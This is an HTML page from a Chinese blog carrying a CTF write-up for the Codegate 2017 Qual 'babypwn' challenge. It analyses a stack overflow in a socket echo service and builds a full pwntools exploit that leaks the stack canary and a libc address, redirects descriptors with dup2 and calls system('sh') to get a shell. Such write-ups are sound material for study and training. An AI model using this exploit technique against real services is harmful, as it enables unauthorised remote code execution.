@@ -1,0 +1,1137 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="cqIhQLk06F" />
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="CTF,writeup,pwn,栈溢出," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Chybeta" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="Codegate 2017 Qual-babypwn-writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Codegate 2017 Qual-babypwn-writeup">
+<meta property="og:url" content="http://yoursite.com/2017/08/12/Codegate-2017-Qual-babypwn-writeup/index.html">
+<meta property="og:site_name" content="Chybeta">
+<meta property="og:description" content="Codegate 2017 Qual-babypwn-writeup">
+<meta property="og:updated_time" content="2017-08-12T15:30:20.412Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Codegate 2017 Qual-babypwn-writeup">
+<meta name="twitter:description" content="Codegate 2017 Qual-babypwn-writeup">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/08/12/Codegate-2017-Qual-babypwn-writeup/"/>
+
+
+
+
+
+  <title> Codegate 2017 Qual-babypwn-writeup | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9c37af8d1f8c5ce0455bd146b47dd7c";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Chybeta</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+    
+      <p class="site-subtitle"></p>
+    
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/12/Codegate-2017-Qual-babypwn-writeup/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="chybeta">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Chybeta">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="Chybeta" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Codegate 2017 Qual-babypwn-writeup
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-12T21:09:15+08:00">
+                2017-08-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeup-bin/" itemprop="url" rel="index">
+                    <span itemprop="name">writeup:bin</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+             <span id="/2017/08/12/Codegate-2017-Qual-babypwn-writeup/" class="leancloud_visitors" data-flag-title="Codegate 2017 Qual-babypwn-writeup">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>Codegate 2017 Qual-babypwn-writeup<br><a id="more"></a></p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h2><p>题目提供了一个32位的程序。参数传递用栈来进行。用gdb载入后看一下保护措施，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Arch:     i386-32-little</div><div class="line">RELRO:    Partial RELRO</div><div class="line">Stack:    Canary found</div><div class="line">NX:       NX enabled</div><div class="line">PIE:      No PIE</div></pre></td></tr></table></figure></p>
+<p>用IDA打开进行分析。文件实现了一个socket服务。其真正的服务函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048A71</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v1; <span class="comment">// [sp+1Ch] [bp-3Ch]@2</span></div><div class="line">  <span class="keyword">char</span> v2; <span class="comment">// [sp+24h] [bp-34h]@1</span></div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+4Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v3 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  <span class="built_in">memset</span>(&amp;v2, <span class="number">0</span>, <span class="number">0x28</span>u);</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">      &#123;</div><div class="line">        sub_80488B1(<span class="string">"\n===============================\n"</span>);</div><div class="line">        sub_80488B1(<span class="string">"1. Echo\n"</span>);</div><div class="line">        sub_80488B1(<span class="string">"2. Reverse Echo\n"</span>);</div><div class="line">        sub_80488B1(<span class="string">"3. Exit\n"</span>);</div><div class="line">        sub_80488B1(<span class="string">"===============================\n"</span>);</div><div class="line">        v1 = sub_804895A();</div><div class="line">        <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        sub_80488B1(<span class="string">"Input Your Message : "</span>);</div><div class="line">        sub_8048907(&amp;v2, <span class="number">0x64</span>u);</div><div class="line">        sub_80488B1(&amp;v2);</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">if</span> ( v1 != <span class="number">2</span> )</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      sub_80488B1(<span class="string">"Input Your Message : "</span>);</div><div class="line">      sub_8048907(&amp;v2, <span class="number">0x64</span>u);</div><div class="line">      sub_80489C8(&amp;v2);</div><div class="line">      sub_80488B1(&amp;v2);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    sub_80488B1(<span class="string">"\n[!] Wrong Input\n"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v3;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>整体上看，实现了三个功能，第一个是读入（sub_8048907）输入的数据并输出来（sub_8048907）。第二个功能是Reverse Echo，好像没啥用。第三个功能是退出。</p>
+<p>在Echo功能的<code>sub_8048907(&amp;v2, 0x64u);</code>中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">ssize_t __cdecl sub_8048907(void *a1, size_t a2)</div><div class="line">&#123;</div><div class="line">  int v2; // ST2C_4@1</div><div class="line">  ssize_t result; // eax@1</div><div class="line">  int v4; // ecx@1</div><div class="line"></div><div class="line">  v2 = *MK_FP(__GS__, 20);</div><div class="line">  result = recv(fd, a1, a2, 0);</div><div class="line">  v4 = *MK_FP(__GS__, 20) ^ v2;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>将读入的字符通过recv()函数拷贝到数组v2中，读入的字符长度可以达到0x64即100个字节。而数组v2所在的位置为 bp-34h ，0x34 = 52。所以很明显这里存在栈溢出。但因为开了Canary保护，因此如果要利用栈溢出，就需要泄露Canary值或者其他技术。</p>
+<p>接下去看输出函数<code>sub_80488B1(&amp;v2);</code>中：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> __<span class="function">cdecl <span class="title">sub_80488B1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v1; <span class="comment">// ST2C_4@1</span></div><div class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// eax@1</span></div><div class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// eax@1</span></div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// ecx@1</span></div><div class="line"></div><div class="line">  v1 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  v2 = <span class="built_in">strlen</span>(a1);</div><div class="line">  result = send(fd, a1, v2, <span class="number">0</span>);</div><div class="line">  v4 = *MK_FP(__GS__, <span class="number">20</span>) ^ v1;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>将数组v2的内容发送出去，发送数据的长度由strlen()指定。</p>
+<h2 id="泄露canary"><a href="#泄露canary" class="headerlink" title="泄露canary"></a>泄露canary</h2><p>接下来我们考虑如何泄露Canary值。Canary值的第一个字节总是<code>\x00</code>，加上是小端序。数组v2在一开始通过<code>memset(&amp;v2, 0, 0x28u);</code>进行初始化。所以结合两者情况，栈的分布约莫下；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;\x00&apos; * 0x28 + ? + ? + ? + `\x00`</div></pre></td></tr></table></figure></p>
+<p>当我们输入的字符个数少于0x28时，比如<code>aaa</code>，则v2中的第四个字符是<code>\x00</code>，则strlen(v2)就为3。如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;a&apos; * 3 + &apos;\x00&apos; * 0x25 + ? + ? + ? + `\x00`</div></pre></td></tr></table></figure></p>
+<p>最后返回输出为字符串“aaa”。</p>
+<p>但若我们输入的字符个数等于0x28时，由于后面的数据是canary值。此时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&apos;a&apos; * 0x28 + ? + ? + ? + `\x00`</div><div class="line">`</div></pre></td></tr></table></figure></p>
+<p>对于数组v2而言，canary的第一个字节<code>\x00</code>成了它的结束标志。在strlen时会把canary值得长度加上，在最后返回输出时将canary的值打印出来。从而完成对canary的泄露。</p>
+<p>泄露出canary后就该考虑如何进行栈溢出利用。程序中提供了system函数。但若要getshell，我们还需要<code>/bin/sh</code>字符串，及其他一些操作。</p>
+<h2 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h2><p>为得到<code>/bin/sh</code>字符串的地址，我们可以去泄露出libc版本。<br>考虑到有send(fd, a1, v2, 0)函数，我们只要让fd为4（默认值），a1为libc库函数的got地址，设置v2为4，第四个为0，就能够将libc库函数的地址打印出来。通过泄露几个libc库函数的地址就能得到libc版本，并利用偏移计算出<code>/bin/sh</code>字符串的地址。</p>
+<p>假如我要泄露setsockopt函数的地址。可以构造payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">payload = &apos;A&apos; * 0x28  </div><div class="line">payload += p32(canary_value)</div><div class="line">payload += &apos;A&apos; * 8 # reach 0x28 + 4 + 8 = 52</div><div class="line">payload += &apos;A&apos; * 4 # reach ret</div><div class="line">payload += p32(send_sym_addr)</div><div class="line">payload += p32(vuln_func_addr)</div><div class="line">payload += p32(4)</div><div class="line">payload += p32(setsockopt_got_addr)</div><div class="line">payload += p32(4)</div><div class="line">payload += p32(0)</div></pre></td></tr></table></figure></p>
+<p>其中注意第二行使用了前面得到的canary值。然后我们加上了12个<code>a</code>，这样才能将返回地址覆盖为send_sym_addr的地址。根据32位程序的栈布局，接下来是send()函数调用完后的返回地址，为进一步利用，这里选择回到有漏洞的服务(8048A71)处。再接下来依次是send函数的四个参数。</p>
+<p>在发送完payload后，我们还需要在程序选项中输入一次<code>3</code>，选择功能<code>3. Exit\n</code>,这样程序才能执行到ret，即被我们覆写了的返回地址。所以需要发送第二段payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">r.recvuntil(&quot;Select menu &gt; &quot;)</div><div class="line">payload = &apos;3&apos;</div><div class="line">r.sendline(payload)</div></pre></td></tr></table></figure></p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>在成功获得libc版本后，现在已经有了system函数，和<code>/bin/sh</code>字符串，但还不能获得shell。因为程序本身是一个socket服务器，所以它的默认文件描述符不是标准输入输出流0或1，而是4，这也是前面调用send函数时第一个参数为4的原因。我们可以使用dup2函数来复制文件描述符，重定向输入输出流。</p>
+<p>dup2函数的原型如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int dup2(int oldfd,int newfd);</div></pre></td></tr></table></figure></p>
+<p>所以对应的，在getshell之前，我们要把原本的文件描述符重定向到标准输入输出流。对应payload为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">payload = <span class="string">'A'</span> * <span class="number">0x28</span>  </div><div class="line">payload += p32(canary_value)</div><div class="line">payload += <span class="string">'A'</span> * <span class="number">8</span> <span class="comment"># reach 0x28 + 4 + 8 = 52</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">4</span> <span class="comment"># reach ret</span></div><div class="line">payload += p32(dup2_libc_addr)</div><div class="line">payload += p32(pop_pop_ret_addr)</div><div class="line">payload += p32(<span class="number">4</span>)</div><div class="line">payload += p32(<span class="number">0</span>)</div><div class="line">payload += p32(dup2_libc_addr)</div><div class="line">payload += p32(pop_pop_ret_addr)</div><div class="line">payload += p32(<span class="number">4</span>)</div><div class="line">payload += p32(<span class="number">1</span>)</div></pre></td></tr></table></figure></p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">r = remote(<span class="string">'127.0.0.1'</span>,<span class="string">'8181'</span>)</div><div class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</div><div class="line">elf = ELF(<span class="string">"./babypwn"</span>)</div><div class="line"></div><div class="line">sh_loclibc_addr = next(libc.search(<span class="string">"sh\x00"</span>))</div><div class="line">setsockopt_loclibc_addr = libc.symbols[<span class="string">'setsockopt'</span>]</div><div class="line">dup2_loclibc_addr = libc.symbols[<span class="string">'dup2'</span>]</div><div class="line"></div><div class="line">pop_ret_addr = <span class="number">0x08048b85</span></div><div class="line">pop_pop_ret_addr = <span class="number">0x08048b84</span></div><div class="line">vuln_func_addr = <span class="number">0x8048A71</span></div><div class="line">system_sym_addr = elf.symbols[<span class="string">"system"</span>]</div><div class="line">send_sym_addr = elf.symbols[<span class="string">'send'</span>]</div><div class="line">setsockopt_got_addr = elf.got[<span class="string">'setsockopt'</span>]</div><div class="line"></div><div class="line">offset_sh_setsockopt = sh_loclibc_addr - setsockopt_loclibc_addr</div><div class="line">offset_dup2_setsockopt = dup2_loclibc_addr - setsockopt_loclibc_addr</div><div class="line"></div><div class="line">log.success(<span class="string">"system symbols address is : "</span> + hex(system_sym_addr))</div><div class="line">log.success(<span class="string">"send address is : "</span> + hex(send_sym_addr))</div><div class="line">log.info(<span class="string">"First Stage : Leak canary value.\n"</span>)</div><div class="line">r.recvuntil(<span class="string">"Select menu &gt; "</span>)</div><div class="line">payload = <span class="string">"1"</span></div><div class="line">r.sendline(payload)</div><div class="line">r.recvuntil(<span class="string">"Input Your Message : "</span>)</div><div class="line">payload = <span class="string">'b'</span> * <span class="number">0x28</span></div><div class="line">r.sendline(payload)</div><div class="line">canary_value = u32(<span class="string">'\x00'</span> + r.recv()[<span class="number">0x29</span>:<span class="number">0x2c</span>])</div><div class="line">log.info(<span class="string">"Canary : %s "</span> % hex(canary_value))</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"Select menu &gt; "</span>)</div><div class="line">payload = <span class="string">"1"</span></div><div class="line">r.sendline(payload)</div><div class="line">r.recvuntil(<span class="string">"Input Your Message : "</span>)</div><div class="line">payload = <span class="string">'A'</span> * <span class="number">0x28</span>  </div><div class="line">payload += p32(canary_value)</div><div class="line">payload += <span class="string">'A'</span> * <span class="number">8</span> <span class="comment"># reach 0x28 + 4 + 8 = 52</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">4</span> <span class="comment"># reach ret</span></div><div class="line">payload += p32(send_sym_addr)</div><div class="line">payload += p32(vuln_func_addr)</div><div class="line">payload += p32(<span class="number">4</span>)</div><div class="line">payload += p32(setsockopt_got_addr)</div><div class="line">payload += p32(<span class="number">4</span>)</div><div class="line">payload += p32(<span class="number">0</span>)</div><div class="line">r.sendline(payload)</div><div class="line">r.recvuntil(<span class="string">"Select menu &gt; "</span>)</div><div class="line">payload = <span class="string">'3'</span></div><div class="line">r.sendline(payload)</div><div class="line">setsockopt_libc_addr = u32(r.recv(<span class="number">4</span>))</div><div class="line">log.success(<span class="string">"setsockopt libc addr is : "</span> + hex(setsockopt_libc_addr))</div><div class="line"></div><div class="line">sh_libc_addr = offset_sh_setsockopt + setsockopt_libc_addr</div><div class="line">dup2_libc_addr = offset_dup2_setsockopt + setsockopt_libc_addr</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"Select menu &gt; "</span>)</div><div class="line">payload = <span class="string">"1"</span></div><div class="line">r.sendline(payload)</div><div class="line">r.recvuntil(<span class="string">"Input Your Message : "</span>)</div><div class="line">payload = <span class="string">'A'</span> * <span class="number">0x28</span>  </div><div class="line">payload += p32(canary_value)</div><div class="line">payload += <span class="string">'A'</span> * <span class="number">8</span> <span class="comment"># reach 0x28 + 4 + 8 = 52</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">4</span> <span class="comment"># reach ret</span></div><div class="line">payload += p32(dup2_libc_addr)</div><div class="line">payload += p32(pop_pop_ret_addr)</div><div class="line">payload += p32(<span class="number">4</span>)</div><div class="line">payload += p32(<span class="number">0</span>)</div><div class="line">payload += p32(dup2_libc_addr)</div><div class="line">payload += p32(pop_pop_ret_addr)</div><div class="line">payload += p32(<span class="number">4</span>)</div><div class="line">payload += p32(<span class="number">1</span>)</div><div class="line">payload += p32(system_sym_addr)</div><div class="line">payload += p32(<span class="number">0</span>)</div><div class="line">payload += p32(sh_libc_addr)</div><div class="line">r.sendline(payload)</div><div class="line">r.recvuntil(<span class="string">"Select menu &gt; "</span>)</div><div class="line">payload = <span class="string">'3'</span></div><div class="line">r.sendline(payload)</div><div class="line">r.recv()</div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
+
+      
+    </div>
+	<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>本文标题:</span><a href="/2017/08/12/Codegate-2017-Qual-babypwn-writeup/">Codegate 2017 Qual-babypwn-writeup</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
+  <p><span>发布时间:</span>2017年08月12日 - 21:08</p>
+  <p><span>最后更新:</span>2017年08月12日 - 23:08</p>
+  <p><span>原始链接:</span><a href="/2017/08/12/Codegate-2017-Qual-babypwn-writeup/" title="Codegate 2017 Qual-babypwn-writeup">http://yoursite.com/2017/08/12/Codegate-2017-Qual-babypwn-writeup/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2017/08/12/Codegate-2017-Qual-babypwn-writeup/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
+</div>
+<script>
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({
+          title: "",
+          text: '复制成功',
+          html: false,
+          timer: 500,
+          showConfirmButton: false
+        });
+      });
+    }));
+</script>
+
+
+      
+	</div>
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/wechat.jpg?raw=true" alt="chybeta WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
